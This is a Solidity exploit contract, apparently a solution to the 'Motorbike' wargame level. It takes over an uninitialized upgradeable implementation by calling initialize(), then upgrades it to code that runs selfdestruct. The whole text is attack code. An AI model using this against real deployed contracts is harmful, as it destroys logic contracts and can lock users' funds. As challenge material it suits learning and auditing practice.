// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IEngine {
    function upgrader() external view returns (address);
    function initialize() external;
    function upgradeToAndCall(address, bytes memory) external payable;
}

contract MotorbikeHack {
    function attack(address _target) external {
        IEngine target = IEngine(_target);
        target.initialize();
        target.upgradeToAndCall(address(this), abi.encodeWithSelector(this.kill.selector));
    }

    function kill() external {
        selfdestruct(payable(address(0)));
    }
}
